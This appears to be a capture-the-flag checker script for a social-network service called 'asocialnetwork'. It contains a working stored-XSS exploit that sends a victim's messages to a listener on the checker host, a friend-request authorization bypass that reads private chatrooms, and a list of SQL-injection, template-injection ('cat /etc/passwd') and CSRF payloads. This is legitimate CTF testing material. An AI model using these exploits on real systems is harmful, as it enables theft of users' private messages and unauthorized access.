import json
import random
import secrets
from typing import Optional
from httpx import AsyncClient
from logging import LoggerAdapter
from enochecker3 import (
    ChainDB,
    Enochecker,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    ExploitCheckerTaskMessage,
    HavocCheckerTaskMessage
)
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
import time
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from http.server import BaseHTTPRequestHandler, HTTPServer
import multiprocessing
import hashlib
import os
from faker import Faker

fake = Faker()
HOST = "0.0.0.0"
PORT = 6452

SERVICE_PORT = 3000
checker = Enochecker("asocialnetwork", SERVICE_PORT)
app = lambda: checker.app
getUrl = lambda task: f"http://{task.address + ':' + str(SERVICE_PORT)}"
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--headless")
chrome_options.add_argument('--no-sandbox')
driver = webdriver.Chrome('/usr/bin/chromedriver', options=chrome_options)


def encode(message, recipient, logger):
    message = message.encode('utf-8').hex()
    recipient = recipient * (len(message) // len(recipient) + 1)
    encoded_message = "".join([chr(ord(message[i]) ^ ord(recipient[i])) for i in range(len(message))])
    encoded_message = encoded_message
    return encoded_message


async def register(task, client, password, logger):
    r = None
    username = None
    for _ in range(10):
        username = fake.name().lower().replace(' ', '_') + str(random.randint(0, 100000))
        logger.debug(f"Registering as {username}:{password}")
        r = await client.post(f"{getUrl(task)}/register",
                              json={"username": username, "password": password, "confirmPassword": password})
        if r.status_code == 302:
            break
    assert_equals(r.status_code, 302, "registering failed")
    return r.cookies, username


def generateNoise():
    return fake.text()

async def login(task, client, username, password, logger):
    logger.debug(f"Logging in as {username}:{password}")
    r = await client.post(f"{getUrl(task)}/login", json={"username": username, "password": password})
    assert_equals(r.status_code, 302, "login failed")
    return r.cookies


async def sendMessage(task, client, recipient, message, logger):
    password = 'password'
    encoded_message = encode(message, recipient, logger)
    cookie, username = await register(task, client, password, logger)
    await client.post(f"{getUrl(task)}/messages/", json={"recipient": recipient, "message": encoded_message},
                      cookies=cookie)
    return username, password, cookie


async def retrieveMessage(task, client, recipient, logger, username, password):
    cookie = await login(task, client, username, password, logger)
    logger.debug(f"Retrieving Message for {username}:{password}")
    r = await client.get(f"{getUrl(task)}/messages/{recipient}", cookies=cookie)
    assert_equals(r.status_code, 200, "retrieving message failed")
    return r, cookie


async def createChatroom(task, name, public, client, cookie, logger):
    logger.debug(f"Creating private chatroom {name}")
    r = await client.post(f"{getUrl(task)}/chatroom", json={'roomname': name, 'public': 'true' if public else 'false'},
                          cookies=cookie)
    assert_equals(r.status_code, 200, "creating private chatroom failed")
    return r.text


@checker.putflag(0)
async def putflag0(task: PutflagCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> \
Optional[str]:
    flag = task.flag
    recipient = "admin"
    username, password, cookie = await sendMessage(task, client, recipient, flag, logger)
    await chain_db.set("userdata", (username, password, flag))
    return json.dumps({'username': username})


@checker.getflag(0)
async def getflag0(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    start = time.time()
    try:
        username, password, flag = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")
    r, cookie = await retrieveMessage(task, client, "admin", logger, username, password)
    assert_in(task.flag, r.text, "flag missing from messages")
    driver.get(f"{getUrl(task)}/logout")
    driver.delete_all_cookies()
    driver.add_cookie({'name': 'session', 'value': cookie.get('session')})
    driver.get(f"{getUrl(task)}/messages/admin")
    while len(driver.page_source.split('<div class="modal-body" style="white-space: pre-line">')) > 1 \
            and time.time() - start < ((task.timeout / 1000) - 1):
        driver.get(f"{getUrl(task)}/messages/admin")


@checker.putflag(1)
async def putflag1(task: PutflagCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> \
Optional[str]:
    flag = task.flag
    password = secrets.token_hex(32)
    cookie, username = await register(task, client, password, logger)
    roomName = secrets.token_hex(10)
    roomUrl = await createChatroom(task, roomName, False, client, cookie, logger)
    logger.debug(f"Created private chatroom {roomName} with url {roomUrl}")
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    r = await client.post(f"{getUrl(task)}/chatroom/{roomUrl}/messages", json={"message": flag}, cookies=cookie)
    await chain_db.set("userdata", (username, password, flag, roomUrl))
    return json.dumps({'username': username})


@checker.getflag(1)
async def getflag1(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, flag, roomUrl = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    assert_in(task.flag, r.text, "flag missing from chatroom")


@checker.putnoise(0)
async def putnoise0(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    noise = generateNoise()
    recipient = "admin"
    username, password, cookie = await sendMessage(task, client, recipient, noise, logger)
    await chain_db.set("noise", (username, password, noise))


@checker.getnoise(0)
async def getnoise0(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, noise = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    r, _ = await retrieveMessage(task, client, "admin", logger, username, password)
    assert_in(noise, r.text, "noise missing from note")


@checker.putnoise(1)
async def putnoise1(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    noise = generateNoise()
    password = secrets.token_hex(32)
    cookie, username = await register(task, client, password, logger)
    roomName = secrets.token_hex(10)
    roomUrl = await createChatroom(task, roomName, True, client, cookie, logger)
    logger.debug(f"Created public chatroom {roomName} with url {roomUrl}")
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    assert_equals(r.status_code, 200, "retrieving chatroom failed")
    r = await client.post(f"{getUrl(task)}/chatroom/{roomUrl}/messages", json={"message": noise}, cookies=cookie)
    assert_equals(r.status_code, 302, "sending message failed")
    await chain_db.set("noise", (username, password, noise, roomUrl))


@checker.getnoise(1)
async def getnoise1(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, noise, roomUrl = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    assert_in(noise, r.text, "noise missing from note")


@checker.putnoise(2)
async def putnoise2(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    noise = generateNoise()
    password = secrets.token_hex(32)
    cookie, username = await register(task, client, password, logger)
    roomName = secrets.token_hex(10)
    roomUrl = await createChatroom(task, roomName, False, client, cookie, logger)
    logger.debug(f"Created private chatroom {roomName} with url {roomUrl}")
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    assert_equals(r.status_code, 200, "retrieving chatroom failed")
    r = await client.post(f"{getUrl(task)}/chatroom/{roomUrl}/messages",
                          json={"message": noise}, cookies=cookie)
    assert_equals(r.status_code, 302, "sending message failed")
    await chain_db.set("noise", (username, password, noise, roomUrl))


@checker.getnoise(2)
async def getnoise2(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, noise, roomUrl = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    assert_in(noise, r.text, "noise missing from note")


@checker.putnoise(3)
async def putnoise3(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    password = secrets.token_hex(32)
    cookie, username = await register(task, client, password, logger)
    profilePic = random.choice(range(1, 50))
    r = await client.post(f"{getUrl(task)}/profile-picture?pic={profilePic}", cookies=cookie)
    assert_equals(r.status_code, 200, "setting profile picture failed")
    await chain_db.set("noise", (username, password, profilePic))


@checker.getnoise(3)
async def getnoise3(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, profilePic = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}", cookies=cookie)
    assert_in(f"/assets/profile-pics/{profilePic}.jpg", r.text, "profile picture missing from home")


@checker.putnoise(4)
async def putnoise4(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    password = secrets.token_hex(32)
    noise = generateNoise()
    cookie, username = await register(task, client, password, logger)
    r = await client.post(f"{getUrl(task)}/profile/{username}/wall", json={'message': noise}, cookies=cookie)
    assert_equals(json.loads(r.text), {'message': 'Message posted', 'status': 200}, "posting to wall failed")
    await chain_db.set("noise", (username, password, noise))


@checker.getnoise(4)
async def getnoise4(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, message = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}/profile/{username}", cookies=cookie)
    assert_in(message, r.text, "message missing from profile")


@checker.putnoise(5)
async def putnoise5(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    password = secrets.token_hex(32)
    noise = generateNoise()
    cookie, username = await register(task, client, password, logger)
    partnerCookie, partner = await register(task, client, password, logger)
    r = await client.post(f"{getUrl(task)}/friends/requests", json={'userName': username, 'partner': partner, 'status': 'send'}, cookies=cookie)
    assert_equals(r.status_code, 200, "sending friend request failed")
    r = await client.post(f"{getUrl(task)}/friends/requests", json={'userName': username, 'partner': partner, 'status': 'accept'}, cookies=cookie)
    assert_equals(r.status_code, 200, "accepting friend request failed")
    r = await client.post(f"{getUrl(task)}/profile/{partner}/wall", json={'message': noise}, cookies=partnerCookie)
    assert_equals(json.loads(r.text), {'message': 'Message posted', 'status': 200}, "posting to wall failed")
    r = await client.get(f"{getUrl(task)}/profile/{partner}", cookies=cookie)
    assert_in(noise, r.text, "message missing from profile")
    await chain_db.set("noise", (username, partner, password, noise))


@checker.getnoise(5)
async def getnoise5(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, partner, password, noise = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}/profile/{partner}", cookies=cookie)
    assert_in(noise, r.text, "noise missing from profile")


@checker.havoc(0)
async def havoc0(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                 logger: LoggerAdapter) -> None:
    username = fake.name().lower().replace(' ', '_') + str(random.randint(100001, 1000000))
    password = secrets.token_hex(32)
    r = await client.post(f"{getUrl(task)}/login", json={"username": username, "password": password})
    assert_equals(r.status_code, 401, "login with invalid credentials succeeded")


@checker.havoc(1)
async def havoc1(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                 logger: LoggerAdapter) -> None:
    username = secrets.token_hex(32)
    password = secrets.token_hex(32)
    r = await client.post(f"{getUrl(task)}/register", json={"username": username, "password": password, "confirmPassword": password})
    assert_equals(r.status_code, 302, "register failed")
    r = await client.post(f"{getUrl(task)}/register", json={"username": username, "password": password, "confirmPassword": password})
    assert_equals(r.status_code, 400, "register with duplicate credentials succeeded")


@checker.havoc(2)
async def havoc2(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                 logger: LoggerAdapter) -> None:
    password = secrets.token_hex(32)
    cookie, username = await register(task, client, password, logger)
    r = await client.get(f"{getUrl(task)}/profile/{username}", cookies=cookie)
    assert_equals(r.status_code, 200, "getting profile failed")


@checker.havoc(3)
async def havoc3(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                 logger: LoggerAdapter) -> None:
    password = secrets.token_hex(32)
    encoded_message = encode(secrets.token_hex(32), secrets.token_hex(32), logger)
    cookie, username = await register(task, client, password, logger)
    r = await client.post(f"{getUrl(task)}/messages/",
                          json={"recipient": secrets.token_hex(32), "message": encoded_message},
                          cookies=cookie)
    assert_equals(r.status_code, 404, "sending message to invalid recipient succeeded")


@checker.havoc(4)
async def havoc4(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    password = secrets.token_hex(32)
    cookie, _ = await register(task, client, password, logger)
    r = await client.get(f"{getUrl(task)}/profile/admin", cookies=cookie)
    assert_equals(r.status_code, 400, "getting profile of admin succeeded")


fakePayloads = [
    "' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP \"^a.*\") THEN SLEEP(3) ELSE 1 END)); -- -",
    "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
    "{{[0]|reduce('system','id')}}",
    "{{['id']|map('system')|join}}",
    "{{['id']|filter('system')}}",
    "{{['id',1]|sort('system')|join}}",
    "{{['cat\x20/etc/passwd']|filter('system')}}",
    "{{['cat$IFS/etc/passwd']|filter('system')}}",
    "{{['id']|filter('passthru')}}",
    "{['id']|map('passthru')}}",
    """<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
     <input name="username" type="hidden" value="CSRFd" />
     <input type="submit" value="Submit Request" />
    </form>
    <script>
     document.getElementById("autosubmit").submit();
    </script>""",
    "<a href=\"http://www.example.com/api/setusername?username=CSRFd\">Click Me</a>"
]


@checker.havoc(5)
async def havoc5(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    password = secrets.token_hex(32)
    await client.post(f"{getUrl(task)}/login", json={"username": fakePayloads[secrets.randbelow(len(fakePayloads))], "password": password})


exploitMessage = "<script>function getText(){{let text='';let messages = document.getElementsByClassName(" \
                 "'message');for(let i = 0; i < messages.length; i++){{text += messages[i].innerHTML;}}return text;" \
                 " }}fetch('http://{0}:6452/', {{method: 'POST', body:'username=' + getText(),headers: {{ " \
                 "'Content-Type': 'application/x-www-form-urlencoded', }},}}); </script>"


def server(logger):
    class ExploitServer(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write("<html><head><title>ASocialNetwork</title></head>".encode())

        def do_POST(self):
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            if not os.path.isfile("/checker/flag.txt"):
                os.mknod("/checker/flag.txt")
            with open("/checker/flag.txt", "wb") as exploit:
                exploit.write(post_data)

    webServer = HTTPServer((HOST, PORT), ExploitServer)
    webServer.serve_forever()


def getFlag():
    while True:
        if os.path.isfile("/checker/flag.txt") and os.access("/checker/flag.txt", os.R_OK):
            with open("/checker/flag.txt", "r") as flag:
                return flag.read()


@checker.exploit(0)
async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient,
                   logger: LoggerAdapter) -> Optional[str]:
    process = multiprocessing.Process(target=server, args=(logger,))
    process.start()
    password = secrets.token_hex(32)
    cookie, username = await register(task, client, password, logger)
    target = json.loads(task.attack_info)['username']
    payload = encode(exploitMessage.format(task.address), target, logger)
    r = await client.post(f"{getUrl(task)}/messages/", json={"recipient": target, "message": payload}, cookies=cookie)
    assert_equals(r.status_code, 200, "exploit failed")
    xss_test(task, logger)
    flagText = getFlag()
    flag = searcher.search_flag(flagText)
    process.kill()
    return flag


def xss_test(task, logger):
    driver.get(f"{getUrl(task)}/logout")
    driver.get(f"{getUrl(task)}/login")
    driver.execute_script(f"document.getElementById('username').value = '{json.loads(task.attack_info)['username']}';")
    driver.execute_script(f"document.getElementById('password').value = 'password';")
    driver.execute_script("document.getElementsByTagName('form')[0].submit();")
    driver.get(f"{getUrl(task)}/messages/admin")


@checker.exploit(1)
async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient,
                   logger: LoggerAdapter) -> Optional[str]:
    password = secrets.token_hex(32)
    cookie, username = await register(task, client, password, logger)
    target = json.loads(task.attack_info)['username']
    r = await client.post(f"{getUrl(task)}/friends/requests",
                          json={'userName': username, 'partner': target, 'status': 'send'}, cookies=cookie)
    assert_equals(r.status_code, 200, "sending friend request failed")
    r = await client.post(f"{getUrl(task)}/friends/requests",
                          json={'userName': username, 'partner': target, 'status': 'accept'}, cookies=cookie)
    assert_equals(r.status_code, 200, "accepting friend request failed")
    r = await client.get(f"{getUrl(task)}/profile/{target}", cookies=cookie)
    if len(r.text.split('<h3>')) < 2:
        return
    roomName = r.text.split('<h3>')[1].split('</h3>')[0]
    roomUrl = hashlib.sha256(roomName.encode()).hexdigest()
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    if flag := searcher.search_flag(r.text):
        return flag


if __name__ == "__main__":
    checker.run()
